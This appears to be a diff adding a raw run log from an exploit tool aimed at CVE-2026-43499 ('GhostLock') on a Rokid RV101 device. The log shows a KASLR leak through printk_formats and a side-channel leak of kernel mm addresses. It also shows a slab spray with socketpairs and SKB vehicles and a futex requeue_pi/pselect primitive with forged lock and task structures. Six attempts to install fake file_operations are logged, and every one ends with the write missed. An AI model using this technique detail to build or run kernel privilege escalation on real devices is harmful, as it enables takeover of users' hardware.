@@ -1,0 +1,253 @@
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=3112 uid=2000 euid=2000 gid=2000
+[*] [T+396835ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffdca522ac0c slide=0x0000001c9b600000
+[*] printk_formats: "Function call interrupts" -> 0xffffffdca52ca100 slide=0x0000001c9b600000
+[+] KASLR: slide=0x0000001c9b600000 base=0xffffffdca3600000 (2 anchors)
+[*] FOPS install attempt 1/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000006299367728 (t=8873, ratio=1774)
+[*]   collision[2]: 00000062996d5298 (t=9102, ratio=1820)
+[*]   collision[3]: 0000006299e59eb8 (t=9140, ratio=1828)
+[*] kernelsnitch: top times: 9140 9102 8873 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=10288 mm=FOUND
+[*] kernelsnitch: elapsed 1928ms mm=ffffff8027c98000
+[*] leaked mm=ffffff8027c98000 slab base=ffffff8027c98000
+[*] v9.14 settle[settle]: 34 rounds, o2=1217 objs=792 (quiet=20)
+[*] v9.10 gate: mm slabs 86 -> 85 objs 792 -> 700 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 59 -> 1941 across full sequence (gate window 86 -> 1941, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8027c99608 value=ffffff8027c99500 mode=5 page=ffffff8027c98000 fake_lock=ffffff8027c98e00 fake_w0=ffffff8027c99000 fake_task=ffffff8027c99200 in=0000000000000000 out1=ffffff8027c99600 out2=ffffffdca5fbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8027c99200 ex3=ffffff8027c98e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=8483
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=8483
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=8483
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=8483
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=8483
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[1] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[2] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffdca5fbcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 2/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000062972d2a50 (t=8988, ratio=1797)
+[*]   collision[2]: 00000062974d5a68 (t=9144, ratio=1828)
+[*]   collision[3]: 0000006298c2a510 (t=9171, ratio=1834)
+[*] kernelsnitch: top times: 9171 9144 8988 20 20 20 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=13324 mm=FOUND
+[*] kernelsnitch: elapsed 2998ms mm=ffffff801b585e00
+[*] leaked mm=ffffff801b585e00 slab base=ffffff801b584000
+[*] v9.14 settle[settle]: 61 rounds, o2=1942 objs=863 (quiet=1)
+[*] v9.10 gate: mm slabs 88 -> 87 objs 863 -> 736 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 86 -> 3658 across full sequence (gate window 88 -> 3658, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff801b585608 value=ffffff801b585500 mode=5 page=ffffff801b584000 fake_lock=ffffff801b584e00 fake_w0=ffffff801b585000 fake_task=ffffff801b585200 in=0000000000000000 out1=ffffff801b585600 out2=ffffffdca5fbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801b585200 ex3=ffffff801b584e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=13849
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=13849
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=13849
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=13849
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=13849
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[4] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[6] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffdca5fbcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 3/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000062951ce230 (t=9047, ratio=1809)
+[*]   collision[2]: 000000629539f0b8 (t=9200, ratio=1840)
+[*]   collision[3]: 0000006295fdf2b8 (t=9239, ratio=1847)
+[*] kernelsnitch: top times: 9239 9200 9047 19 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11482 mm=FOUND
+[*] kernelsnitch: elapsed 2195ms mm=ffffff802dc56d00
+[*] leaked mm=ffffff802dc56d00 slab base=ffffff802dc54000
+[*] v9.14 settle[settle]: 45 rounds, o2=1971 objs=904 (quiet=20)
+[*] v9.10 gate: mm slabs 90 -> 90 objs 904 -> 771 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 0 -> 2554 across full sequence (gate window 90 -> 2554, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff802dc55608 value=ffffff802dc55500 mode=5 page=ffffff802dc54000 fake_lock=ffffff802dc54e00 fake_w0=ffffff802dc55000 fake_task=ffffff802dc55200 in=0000000000000000 out1=ffffff802dc55600 out2=ffffffdca5fbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff802dc55200 ex3=ffffff802dc54e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=19213
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=19213
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=19213
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=19213
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=19213
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[4] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[5] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffdca5fbcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 4/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 00000062943a10c8 (t=9164, ratio=1832)
+[*]   collision[2]: 000000629464f638 (t=9134, ratio=1826)
+[*]   collision[3]: 0000006294b7ffb8 (t=9116, ratio=1823)
+[*] kernelsnitch: top times: 9164 9134 9116 19 19 19 19 16
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=12236 mm=FOUND
+[*] kernelsnitch: elapsed 1978ms mm=ffffff801512bc00
+[*] leaked mm=ffffff801512bc00 slab base=ffffff8015128000
+[*] v9.14 settle[settle]: 22 rounds, o2=2093 objs=915 (quiet=20)
+[*] v9.10 gate: mm slabs 91 -> 91 objs 915 -> 788 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 1 -> 2819 across full sequence (gate window 91 -> 2819, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8015129608 value=ffffff8015129500 mode=5 page=ffffff8015128000 fake_lock=ffffff8015128e00 fake_w0=ffffff8015129000 fake_task=ffffff8015129200 in=0000000000000000 out1=ffffff8015129600 out2=ffffffdca5fbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8015129200 ex3=ffffff8015128e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=24577
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=24577
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=24577
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=24577
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=24577
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[16] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[17] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffdca5fbcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 5/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000006292fa60f0 (t=9272, ratio=1854)
+[*]   collision[2]: 0000006292fb0140 (t=9250, ratio=1850)
+[*]   collision[3]: 0000006293673758 (t=9160, ratio=1832)
+[*] kernelsnitch: top times: 9272 9250 9160 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=9286 mm=FOUND
+[*] kernelsnitch: elapsed 1658ms mm=ffffff80251b03c0
+[*] leaked mm=ffffff80251b03c0 slab base=ffffff80251b0000
+[*] v9.14 settle[settle]: 37 rounds, o2=2246 objs=938 (quiet=20)
+[*] v9.10 gate: mm slabs 92 -> 92 objs 938 -> 805 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 1 -> 2656 across full sequence (gate window 92 -> 2656, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff80251b1608 value=ffffff80251b1500 mode=5 page=ffffff80251b0000 fake_lock=ffffff80251b0e00 fake_w0=ffffff80251b1000 fake_task=ffffff80251b1200 in=0000000000000000 out1=ffffff80251b1600 out2=ffffffdca5fbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80251b1200 ex3=ffffff80251b0e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=29942
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=29942
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=29942
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=29942
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=29942
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[3] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[4] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffdca5fbcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[*] FOPS install attempt 6/6
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000006292507bf8 (t=9596, ratio=1919)
+[*]   collision[2]: 00000062938f3b58 (t=9595, ratio=1919)
+[*]   collision[3]: 0000006293936d70 (t=9600, ratio=1920)
+[*] kernelsnitch: top times: 9600 9596 9595 19 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11715 mm=FOUND
+[*] kernelsnitch: elapsed 2800ms mm=ffffff802e869680
+[*] leaked mm=ffffff802e869680 slab base=ffffff802e868000
+[*] v9.14 settle[settle]: 47 rounds, o2=2113 objs=933 (quiet=20)
+[*] v9.10 gate: mm slabs 92 -> 92 objs 933 -> 805 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 94 -> 2612 across full sequence (gate window 92 -> 2612, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff802e869608 value=ffffff802e869500 mode=5 page=ffffff802e868000 fake_lock=ffffff802e868e00 fake_w0=ffffff802e869000 fake_task=ffffff802e869200 in=0000000000000000 out1=ffffff802e869600 out2=ffffffdca5fbcbc0 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff802e869200 ex3=ffffff802e868e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=3969
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=3969
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=3969
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=3969
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=3969
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=1 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*]   DIAG veh[0] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[10] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*]   DIAG veh[11] n=15872 llseek=0xffffffdca481ab88 read=0xffffffdca4838e20 scratch=0x0000000000000000 safe=0x0000000000000000
+[*] install_fake_fops_v2 DIAG: write#1 MISSED (vehicle -1, llseek=0x0000000000000000 exp=0xffffffdca5fbcbc0)
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[!] FOPS install failed after 6 attempts
